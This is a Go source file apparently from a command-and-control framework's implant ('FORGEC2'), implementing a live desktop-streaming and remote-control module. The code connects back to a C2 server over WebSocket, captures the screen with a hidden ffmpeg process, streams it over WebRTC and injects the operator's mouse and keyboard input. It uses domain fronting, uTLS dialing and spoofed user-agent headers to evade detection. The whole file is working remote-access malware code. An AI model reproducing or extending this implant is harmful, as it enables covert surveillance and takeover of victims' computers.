//go:build linux || windows || darwin
// +build linux windows darwin

package main

// WebRTC live desktop agent side.
//
// This file is owned by the optional "webrtc" agent module. The generator
// drops it (and the Pion dependency) when the module is excluded, which keeps
// Pion out of agents that only need the JPEG screen stream.
//
// Flow: screen_webrtc_start opens a single-use signaling WebSocket to the C2
// server, creates a sendonly H.264 PeerConnection, and waits for the browser's
// offer. Once negotiated it starts ffmpeg, captures RTP on loopback, and feeds
// a Pion TrackLocalStaticRTP. Input events arrive on the same signaling socket
// and reuse the existing remoteInputDispatch implementation.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/pion/rtp"
	"github.com/pion/webrtc/v4"
)

const (
	webRTCSignalReadLimit  = 512 * 1024
	webRTCSignalDeadline   = 5 * time.Minute
	webRTCSignalPingPeriod = 30 * time.Second
)

type webRTCIceServer struct {
	URLs       []string `json:"urls"`
	Username   string   `json:"username,omitempty"`
	Credential string   `json:"credential,omitempty"`
}

type webRTCSettings struct {
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	FPS         int    `json:"fps"`
	BitrateKbps int    `json:"bitrate_kbps"`
	Encoder     string `json:"encoder"`
}

type webRTCAgentStartData struct {
	SessionID  string            `json:"session_id"`
	Token      string            `json:"token"`
	AgentID    string            `json:"agent_id"`
	Path       string            `json:"path"`
	IceServers []webRTCIceServer `json:"ice_servers"`
	Settings   webRTCSettings    `json:"settings"`
}

type webRTCSignal struct {
	Type      string          `json:"type"`
	SDP       string          `json:"sdp,omitempty"`
	Candidate json.RawMessage `json:"candidate,omitempty"`
	Event     json.RawMessage `json:"event,omitempty"`
	State     string          `json:"state,omitempty"`
	Reason    string          `json:"reason,omitempty"`
}

type webRTCInputEvent struct {
	Type string `json:"type"`
	X    int    `json:"x"`
	Y    int    `json:"y"`
	Key  string `json:"key"`
}

type agentWebRTCSession struct {
	id       string
	conn     *websocket.Conn
	pc       *webrtc.PeerConnection
	track    *webrtc.TrackLocalStaticRTP
	rtpConn  *net.UDPConn
	ffmpeg   string
	settings webRTCSettings
	ctx      context.Context
	cancel   context.CancelFunc

	writeMu      sync.Mutex
	cmdMu        sync.Mutex
	rtpMu        sync.Mutex
	cmd          *exec.Cmd
	pipelineOnce sync.Once
	stopOnce     sync.Once

	screenOnce sync.Once
	screenX    int
	screenY    int
	screenW    int
	screenH    int
	screenOK   bool
}

var (
	webRTCSessionMu     sync.Mutex
	webRTCSessionActive *agentWebRTCSession
)

func handleScreenWebRTCStart(task Task, res *TaskResult) {
	var data webRTCAgentStartData
	if err := json.Unmarshal([]byte(task.Data), &data); err != nil {
		res.Error = "screen_webrtc_start: invalid session payload"
		return
	}
	if err := startAgentWebRTC(data); err != nil {
		res.Error = "screen_webrtc_start: " + err.Error()
		return
	}
	res.Output = "webrtc: signaling connected; waiting for the operator offer"
}

func handleScreenWebRTCStop(task Task, res *TaskResult) {
	id := strings.TrimSpace(task.Data)
	if id == "" {
		id = strings.TrimSpace(task.Command)
	}
	if stopAgentWebRTC(id) {
		res.Output = "webrtc: stream stopped"
		return
	}
	res.Output = "webrtc: no active stream"
}

func stopAgentWebRTC(id string) bool {
	webRTCSessionMu.Lock()
	s := webRTCSessionActive
	if s == nil || (id != "" && !strings.EqualFold(id, s.id)) {
		webRTCSessionMu.Unlock()
		return false
	}
	webRTCSessionMu.Unlock()
	s.stop("stop requested")
	return true
}

func startAgentWebRTC(data webRTCAgentStartData) error {
	if strings.TrimSpace(data.SessionID) == "" || strings.TrimSpace(data.Token) == "" {
		return fmt.Errorf("missing session id or signaling token")
	}
	settings := data.Settings
	if settings.Width == 0 && settings.Height == 0 {
		settings.Width, settings.Height = 1280, 720
	}
	if settings.FPS <= 0 {
		settings.FPS = 30
	}
	if settings.BitrateKbps <= 0 {
		settings.BitrateKbps = 2500
	}
	if settings.Width < 640 || settings.Width > 1920 || settings.Height < 360 || settings.Height > 1080 {
		return fmt.Errorf("unsupported dimensions %dx%d (1080p maximum)", settings.Width, settings.Height)
	}
	if settings.Width%2 != 0 || settings.Height%2 != 0 {
		return fmt.Errorf("dimensions must be even")
	}
	if settings.FPS < 15 || settings.FPS > 30 {
		return fmt.Errorf("unsupported frame rate %d", settings.FPS)
	}
	if settings.BitrateKbps < 500 || settings.BitrateKbps > 8000 {
		return fmt.Errorf("unsupported bitrate %d", settings.BitrateKbps)
	}
	settings.Encoder = normalizeAgentEncoder(settings.Encoder)
	data.Settings = settings

	ffmpeg := findFFmpegBinary()
	if ffmpeg == "" {
		return fmt.Errorf("ffmpeg not found (install ffmpeg or set FORGEC2_FFMPEG to its full path)")
	}

	ctx, cancel := context.WithCancel(context.Background())
	sess := &agentWebRTCSession{
		id:       data.SessionID,
		ffmpeg:   ffmpeg,
		settings: settings,
		ctx:      ctx,
		cancel:   cancel,
	}
	webRTCSessionMu.Lock()
	if webRTCSessionActive != nil {
		webRTCSessionMu.Unlock()
		cancel()
		return fmt.Errorf("a WebRTC stream is already active")
	}
	webRTCSessionActive = sess
	webRTCSessionMu.Unlock()

	if err := sess.connect(data); err != nil {
		sess.stop("connect failed")
		return err
	}
	go sess.readLoop()
	return nil
}

func normalizeAgentEncoder(encoder string) string {
	switch strings.ToLower(strings.TrimSpace(encoder)) {
	case "h264_nvenc", "h264_qsv", "h264_amf", "h264_videotoolbox", "libx264":
		return strings.ToLower(strings.TrimSpace(encoder))
	default:
		return "libx264"
	}
}

func findFFmpegBinary() string {
	if p := strings.TrimSpace(os.Getenv("FORGEC2_FFMPEG")); p != "" {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p
	}
	if runtime.GOOS == "windows" {
		if p, err := exec.LookPath("ffmpeg.exe"); err == nil {
			return p
		}
		if exe, err := os.Executable(); err == nil {
			p := filepath.Join(filepath.Dir(exe), "ffmpeg.exe")
			if st, statErr := os.Stat(p); statErr == nil && !st.IsDir() {
				return p
			}
		}
	}
	return ""
}

func (s *agentWebRTCSession) connect(data webRTCAgentStartData) error {
	conn, err := dialAgentSignaling(data)
	if err != nil {
		return err
	}
	s.conn = conn
	conn.SetReadLimit(webRTCSignalReadLimit)
	_ = conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
	})

	media := &webrtc.MediaEngine{}
	if err := media.RegisterDefaultCodecs(); err != nil {
		return fmt.Errorf("media codecs: %w", err)
	}
	api := webrtc.NewAPI(webrtc.WithMediaEngine(media))
	iceServers := make([]webrtc.ICEServer, 0, len(data.IceServers))
	for _, srv := range data.IceServers {
		if len(srv.URLs) == 0 {
			continue
		}
		iceServers = append(iceServers, webrtc.ICEServer{
			URLs:           srv.URLs,
			Username:       srv.Username,
			Credential:     srv.Credential,
			CredentialType: webrtc.ICECredentialTypePassword,
		})
	}
	pc, err := api.NewPeerConnection(webrtc.Configuration{
		ICEServers:         iceServers,
		ICETransportPolicy: webrtc.ICETransportPolicyAll,
	})
	if err != nil {
		return fmt.Errorf("peer connection: %w", err)
	}
	s.pc = pc
	track, err := webrtc.NewTrackLocalStaticRTP(webrtc.RTPCodecCapability{
		MimeType:  webrtc.MimeTypeH264,
		ClockRate: 90000,
	}, "video", "screen")
	if err != nil {
		return fmt.Errorf("video track: %w", err)
	}
	s.track = track
	sender, err := pc.AddTrack(track)
	if err != nil {
		return fmt.Errorf("add video track: %w", err)
	}
	go func() {
		buf := make([]byte, 1500)
		for {
			if _, _, readErr := sender.Read(buf); readErr != nil {
				return
			}
		}
	}()

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil || s.ctx.Err() != nil {
			return
		}
		_ = s.sendJSON(map[string]any{"type": "ice", "candidate": c.ToJSON()})
	})
	pc.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		switch state {
		case webrtc.PeerConnectionStateConnected:
			_ = s.sendJSON(map[string]any{"type": "state", "state": "connected"})
			// Start ffmpeg only once media transport is up, otherwise the
			// first IDR (and its SPS/PPS) is dropped by the track and the
			// browser shows black until the next keyframe.
			go s.ensurePipeline()
		case webrtc.PeerConnectionStateFailed:
			_ = s.sendJSON(map[string]any{"type": "error", "reason": "WebRTC connection failed"})
			go s.stop("connection failed")
		case webrtc.PeerConnectionStateDisconnected:
			_ = s.sendJSON(map[string]any{"type": "state", "state": "disconnected"})
		}
	})

	_ = s.sendJSON(map[string]any{"type": "state", "state": "waiting_for_offer"})
	return nil
}

func dialAgentSignaling(data webRTCAgentStartData) (*websocket.Conn, error) {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		return nil, fmt.Errorf("no C2 URL configured")
	}
	path := strings.TrimSpace(data.Path)
	if path == "" {
		path = "/ws/rd/agent"
	}
	start := int(currentC2Idx.Load())
	if start < 0 || start >= len(urls) {
		start = 0
	}
	var lastErr error
	for i := 0; i < len(urls); i++ {
		c2 := urls[(start+i)%len(urls)]
		wsURL, err := buildAgentSignalURL(c2, path, data.SessionID, data.Token, agentUUID)
		if err != nil {
			lastErr = err
			continue
		}
		dialer := &websocket.Dialer{HandshakeTimeout: 10 * time.Second}
		if strings.HasPrefix(wsURL, "wss://") {
			dialer.NetDialContext = utlsDialContext
		}
		header := http.Header{}
		if DomainFront != "" {
			header.Set("Host", DomainFront)
		}
		header.Set("User-Agent", getActiveUserAgentFromConfig())
		for k, v := range getActiveHeaders() {
			if strings.EqualFold(k, "User-Agent") {
				continue
			}
			header.Set(k, v)
		}
		conn, resp, err := dialer.Dial(wsURL, header)
		if err != nil {
			if resp != nil {
				noteServerClock(resp.Header)
			}
			lastErr = err
			continue
		}
		if resp != nil {
			noteServerClock(resp.Header)
		}
		return conn, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no usable C2 URL")
	}
	return nil, fmt.Errorf("signaling connect failed: %w", lastErr)
}

func buildAgentSignalURL(c2URL, path, sessionID, token, agentID string) (string, error) {
	path = strings.TrimSpace(path)
	if path == "" {
		path = "/ws/rd/agent"
	}
	if !strings.HasPrefix(path, "/") || strings.HasPrefix(path, "//") {
		return "", fmt.Errorf("invalid signaling path %q", path)
	}
	u, err := url.Parse(strings.TrimSpace(c2URL))
	if err != nil {
		return "", err
	}
	scheme := ""
	switch strings.ToLower(u.Scheme) {
	case "https", "wss":
		scheme = "wss"
	case "http", "ws":
		scheme = "ws"
	default:
		return "", fmt.Errorf("unsupported C2 URL scheme %q", u.Scheme)
	}
	host := u.Host
	if host == "" {
		return "", fmt.Errorf("C2 URL has no host")
	}
	q := url.Values{}
	q.Set("session", sessionID)
	q.Set("token", token)
	if agentID != "" {
		q.Set("agent", agentID)
	}
	return scheme + "://" + host + path + "?" + q.Encode(), nil
}

func (s *agentWebRTCSession) sendJSON(v any) error {
	if s.conn == nil {
		return fmt.Errorf("signaling socket closed")
	}
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	_ = s.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	return s.conn.WriteJSON(v)
}

// scaleInput maps browser coordinates from the encoded video back to native
// screen pixels. ffmpeg pads and scales the capture to settings.Width/Height,
// so forwarding the video coordinates unchanged would target the wrong place
// on any display larger than the stream (for example 1080p at the 720p
// preset). The native rectangle is probed once per session because ffmpeg
// fixes the capture size when the pipeline starts.
func (s *agentWebRTCSession) scaleInput(raw []byte) []byte {
	s.screenOnce.Do(func() {
		s.screenX, s.screenY, s.screenW, s.screenH, s.screenOK = nativeScreenRect()
	})
	return mapWebRTCInput(raw, s.screenX, s.screenY, s.screenW, s.screenH, s.settings.Width, s.settings.Height, s.screenOK)
}

// mapWebRTCInput is the testable half of scaleInput. It only rewrites pointer
// events; keyboard events and malformed input pass through unchanged.
func mapWebRTCInput(raw []byte, screenX, screenY, screenW, screenH, streamW, streamH int, haveScreen bool) []byte {
	if !haveScreen || screenW <= 0 || screenH <= 0 || streamW <= 0 || streamH <= 0 {
		return raw
	}
	var ev webRTCInputEvent
	if err := json.Unmarshal(raw, &ev); err != nil {
		return raw
	}
	switch strings.ToLower(ev.Type) {
	case "move", "click":
	default:
		return raw
	}
	// ffmpeg scales the capture with force_original_aspect_ratio=decrease and
	// pads to the stream size. Mirror that letterbox so non-16:9 screens map
	// correctly instead of treating the black bars as desktop pixels.
	contentW, contentH := streamW, streamH
	if screenW*streamH > streamW*screenH {
		contentH = streamW * screenH / screenW
	} else if screenW*streamH < streamW*screenH {
		contentW = streamH * screenW / screenH
	}
	if contentW <= 0 {
		contentW = 1
	}
	if contentH <= 0 {
		contentH = 1
	}
	offsetX := (streamW - contentW) / 2
	offsetY := (streamH - contentH) / 2
	ev.X = scaleWebRTCCoord(ev.X, screenX, screenW, contentW, offsetX)
	ev.Y = scaleWebRTCCoord(ev.Y, screenY, screenH, contentH, offsetY)
	out, err := json.Marshal(ev)
	if err != nil {
		return raw
	}
	return out
}

func scaleWebRTCCoord(value, origin, screenSize, contentSize, offset int) int {
	scaled := origin + ((value-offset)*screenSize+contentSize/2)/contentSize
	if scaled < origin {
		return origin
	}
	if max := origin + screenSize - 1; scaled > max {
		return max
	}
	return scaled
}

func (s *agentWebRTCSession) readLoop() {
	defer s.stop("signaling closed")
	pingDone := make(chan struct{})
	defer close(pingDone)
	go func() {
		ticker := time.NewTicker(webRTCSignalPingPeriod)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_ = s.conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(5*time.Second))
			case <-pingDone:
				return
			}
		}
	}()

	var pendingICE []webrtc.ICECandidateInit
	remoteSet := false
	for {
		_, raw, err := s.conn.ReadMessage()
		if err != nil {
			return
		}
		_ = s.conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
		var msg webRTCSignal
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}
		switch strings.ToLower(msg.Type) {
		case "offer":
			if remoteSet {
				continue
			}
			if !strings.Contains(strings.ToUpper(msg.SDP), "H264") {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "browser offer does not include H.264"})
				return
			}
			if err := s.pc.SetRemoteDescription(webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: msg.SDP}); err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "set offer: " + err.Error()})
				return
			}
			remoteSet = true
			for _, cand := range pendingICE {
				if err := s.pc.AddICECandidate(cand); err != nil {
					break
				}
			}
			pendingICE = nil
			answer, err := s.pc.CreateAnswer(nil)
			if err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "create answer: " + err.Error()})
				return
			}
			if err := s.pc.SetLocalDescription(answer); err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "set answer: " + err.Error()})
				return
			}
			if err := s.sendJSON(map[string]any{"type": "answer", "sdp": answer.SDP}); err != nil {
				return
			}
			// The pipeline starts from OnConnectionStateChange(connected).
		case "ice":
			if len(msg.Candidate) == 0 {
				continue
			}
			var cand webrtc.ICECandidateInit
			if err := json.Unmarshal(msg.Candidate, &cand); err != nil {
				continue
			}
			if !remoteSet {
				pendingICE = append(pendingICE, cand)
				continue
			}
			_ = s.pc.AddICECandidate(cand)
		case "input":
			if len(msg.Event) > 0 {
				_, _ = remoteInputDispatch(string(s.scaleInput(msg.Event)))
			}
		case "stop", "session_end":
			return
		}
	}
}

func (s *agentWebRTCSession) ensurePipeline() {
	s.pipelineOnce.Do(func() {
		if err := s.startRTPPipeline(); err != nil {
			_ = s.sendJSON(map[string]any{"type": "error", "reason": err.Error()})
			s.stop("pipeline failed")
		}
	})
}

func (s *agentWebRTCSession) startRTPPipeline() error {
	if s.ctx.Err() != nil {
		return fmt.Errorf("WebRTC session is already closed")
	}
	if s.track == nil {
		return fmt.Errorf("video track is not initialized")
	}
	conn, err := net.ListenUDP("udp4", &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1), Port: 0})
	if err != nil {
		return fmt.Errorf("RTP listener: %w", err)
	}
	s.rtpMu.Lock()
	s.rtpConn = conn
	s.rtpMu.Unlock()
	go func() {
		buf := make([]byte, 2048)
		for {
			n, _, readErr := conn.ReadFromUDP(buf)
			if readErr != nil {
				return
			}
			var pkt rtp.Packet
			if err := pkt.Unmarshal(buf[:n]); err != nil {
				continue
			}
			if err := s.track.WriteRTP(&pkt); err != nil {
				return
			}
		}
	}()

	if s.ctx.Err() != nil {
		_ = conn.Close()
		return fmt.Errorf("WebRTC session is already closed")
	}
	args, err := buildScreenFFmpegArgs(s.settings, conn.LocalAddr().(*net.UDPAddr).Port)
	if err != nil {
		_ = conn.Close()
		return err
	}
	cmd := exec.CommandContext(s.ctx, s.ffmpeg, args...)
	applyHideWindow(cmd)
	stderr := &cappedBuffer{max: 4096}
	cmd.Stderr = stderr
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("ffmpeg start: %w", err)
	}
	s.cmdMu.Lock()
	s.cmd = cmd
	s.cmdMu.Unlock()
	_ = s.sendJSON(map[string]any{"type": "state", "state": "streaming"})
	go func() {
		waitErr := cmd.Wait()
		if s.ctx.Err() != nil {
			return
		}
		reason := strings.TrimSpace(stderr.String())
		if reason == "" && waitErr != nil {
			reason = waitErr.Error()
		}
		if reason == "" {
			reason = "ffmpeg exited before the stream was stopped"
		}
		if len(reason) > 500 {
			reason = reason[:500]
		}
		_ = s.sendJSON(map[string]any{"type": "error", "reason": "ffmpeg: " + reason})
		s.stop("ffmpeg exited")
	}()
	return nil
}

func (s *agentWebRTCSession) stop(reason string) {
	s.stopOnce.Do(func() {
		webRTCSessionMu.Lock()
		if webRTCSessionActive == s {
			webRTCSessionActive = nil
		}
		webRTCSessionMu.Unlock()
		s.cancel()
		if s.conn != nil {
			_ = s.conn.WriteControl(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""),
				time.Now().Add(time.Second))
			_ = s.conn.Close()
		}
		if s.pc != nil {
			_ = s.pc.Close()
		}
		s.rtpMu.Lock()
		rtpConn := s.rtpConn
		s.rtpConn = nil
		s.rtpMu.Unlock()
		if rtpConn != nil {
			_ = rtpConn.Close()
		}
		s.cmdMu.Lock()
		cmd := s.cmd
		s.cmd = nil
		s.cmdMu.Unlock()
		if cmd != nil && cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		_ = reason
	})
}

func buildScreenFFmpegArgs(settings webRTCSettings, rtpPort int) ([]string, error) {
	if rtpPort <= 0 || rtpPort > 65535 {
		return nil, fmt.Errorf("invalid RTP port")
	}
	args := []string{"-hide_banner", "-loglevel", "error", "-nostdin"}
	switch runtime.GOOS {
	case "windows":
		args = append(args, "-f", "gdigrab", "-framerate", fmt.Sprintf("%d", settings.FPS), "-draw_mouse", "1", "-i", "desktop")
	case "linux":
		display := strings.TrimSpace(os.Getenv("DISPLAY"))
		if display == "" {
			display = ":0.0"
		}
		size := linuxScreenSize()
		if size == "" {
			size = fmt.Sprintf("%dx%d", settings.Width, settings.Height)
		}
		args = append(args, "-f", "x11grab", "-framerate", fmt.Sprintf("%d", settings.FPS),
			"-draw_mouse", "1", "-video_size", size, "-i", display+"+0,0")
	case "darwin":
		args = append(args, "-f", "avfoundation", "-framerate", fmt.Sprintf("%d", settings.FPS),
			"-capture_cursor", "1", "-i", "1:none")
	default:
		return nil, fmt.Errorf("unsupported platform %s", runtime.GOOS)
	}

	level := "3.1"
	if settings.Width*settings.Height > 1280*720 {
		level = "4.0"
	}
	filter := fmt.Sprintf("scale=%d:%d:force_original_aspect_ratio=decrease,pad=%d:%d:(ow-iw)/2:(oh-ih)/2,format=yuv420p",
		settings.Width, settings.Height, settings.Width, settings.Height)
	args = append(args, "-vf", filter)
	args = append(args, encoderFFmpegArgs(settings.Encoder, level)...)
	gop := settings.FPS * 2
	args = append(args,
		"-g", fmt.Sprintf("%d", gop),
		"-keyint_min", fmt.Sprintf("%d", gop),
		"-pix_fmt", "yuv420p",
		"-b:v", fmt.Sprintf("%dk", settings.BitrateKbps),
		"-maxrate", fmt.Sprintf("%dk", settings.BitrateKbps),
		"-bufsize", fmt.Sprintf("%dk", settings.BitrateKbps*2),
		"-an",
		"-f", "rtp",
		"-pkt_size", "1200",
		fmt.Sprintf("rtp://127.0.0.1:%d", rtpPort),
	)
	return args, nil
}

func encoderFFmpegArgs(encoder, level string) []string {
	switch encoder {
	case "h264_nvenc":
		return []string{"-c:v", "h264_nvenc", "-preset", "p4", "-tune", "ll", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_qsv":
		return []string{"-c:v", "h264_qsv", "-preset", "veryfast", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_amf":
		return []string{"-c:v", "h264_amf", "-usage", "ultralowlatency", "-quality", "speed", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_videotoolbox":
		return []string{"-c:v", "h264_videotoolbox", "-realtime", "true", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	default:
		return []string{"-c:v", "libx264", "-preset", "veryfast", "-tune", "zerolatency",
			"-profile:v", "baseline", "-level:v", level, "-bf", "0",
			"-sc_threshold", "0", "-x264-params", "repeat-headers=1"}
	}
}

// linuxScreenSize asks xrandr for the first connected output; an empty result
// falls back to the requested stream dimensions.
func linuxScreenSize() string {
	out, err := exec.Command("xrandr", "--current").Output()
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, " connected") {
			continue
		}
		for _, field := range strings.Fields(line) {
			if strings.Contains(field, "x") && strings.Contains(field, "+0+0") {
				size := strings.SplitN(field, "+", 2)[0]
				if strings.Contains(size, "x") {
					return size
				}
			}
		}
	}
	return ""
}

type cappedBuffer struct {
	buf bytes.Buffer
	max int
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	n := len(p)
	if b.max > 0 && b.buf.Len() < b.max {
		remaining := b.max - b.buf.Len()
		if len(p) > remaining {
			p = p[:remaining]
		}
		_, _ = b.buf.Write(p)
	}
	return n, nil
}

func (b *cappedBuffer) String() string {
	return b.buf.String()
}
